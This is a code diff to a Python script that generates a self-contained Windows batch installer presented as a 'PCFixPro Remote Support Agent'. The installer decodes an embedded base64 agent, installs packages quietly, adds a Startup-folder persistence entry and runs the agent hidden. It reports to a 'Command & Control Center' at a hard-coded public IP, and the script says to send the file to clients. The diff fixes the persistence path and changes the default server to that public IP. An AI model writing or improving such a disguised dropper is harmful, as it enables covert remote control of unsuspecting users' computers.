@@ -31,7 +31,6 @@ def create_single_installer(server_ip=None):
     # Create the single installer
     installer_path = downloads_dir / "PCFixPro_Installer.bat"
     
-    # Escape for batch file
     installer_content = f"""@echo off
 :: PCFixPro Remote Support Agent - Single File Installer v2.0
 :: All code is embedded - no external files needed
@@ -42,10 +41,7 @@ setlocal enabledelayedexpansion
 :: Configuration
 """
     
-    if server_ip:
-        installer_content += f"set SERVER_IP={server_ip}\n"
-    else:
-        installer_content += "set SERVER_IP=192.168.100.253\n"
+    installer_content += f"set SERVER_IP={server_ip or '102.209.236.22'}\n"
     
     installer_content += """
 echo ========================================
@@ -78,7 +74,7 @@ if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
 :: Extract and decode embedded agent
 echo [1/3] Installing agent...
-powershell -Command "& {[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" + agent_b64 + "')) | Out-File -FilePath '%INSTALL_DIR%\\agent.py' -Encoding UTF8}"
+powershell -Command "& {{[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{base64}')) | Out-File -FilePath '%INSTALL_DIR%\\agent.py' -Encoding UTF8}}"
 
 :: Write config file with server IP
 (
@@ -92,17 +88,17 @@ echo }}
 
 :: Install Python dependencies silently
 echo [2/3] Installing dependencies...
-pip install python-socketio requests pywin32 Pillow wmi mss --quiet --no-warn-script-location 2>nul
+pip install python-socketio requests pywin32 --quiet --no-warn-script-location 2>nul
 
 :: Start the agent
 echo [3/3] Starting agent...
 cd /d "%INSTALL_DIR%"
 
-:: Create startup entry
+:: Create startup entry - fixed path
 echo import os, sys, subprocess > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pcfixpro_agent.py"
 echo sys.path.insert(0, r'%INSTALL_DIR%') >> "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pcfixpro_agent.py"
 echo os.chdir(r'%INSTALL_DIR%') >> "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pcfixpro_agent.py"
-echo subprocess.Popen([sys.executable, 'agent.py']) >> "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Startup\\pcfixpro_agent.py"
+echo subprocess.Popen([sys.executable, 'agent.py']) >> "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pcfixpro_agent.py"
 
 :: Start agent now (hidden)
 start /B pythonw.exe "%INSTALL_DIR%\\agent.py"
@@ -130,16 +126,16 @@ echo in your Command & Control Center.
 echo ========================================
 echo.
 pause
-"""
+""".format(base64=agent_b64)
     
     installer_path.write_text(installer_content)
     print(f"[OK] Created single installer: {installer_path}")
-    print(f"[INFO] Server IP: {server_ip or '192.168.100.253'}")
+    print(f"[INFO] Server IP: {server_ip or '102.209.236.22'}")
     print("[INFO] Send this .bat file to clients - it's fully self-contained!")
 
 if __name__ == "__main__":
     import argparse
     parser = argparse.ArgumentParser(description='Create single-file installer')
-    parser.add_argument('--server-ip', help='Server IP address', default='192.168.100.253')
+    parser.add_argument('--server-ip', help='Server IP address', default='102.209.236.22')
     args = parser.parse_args()
     create_single_installer(args.server_ip)
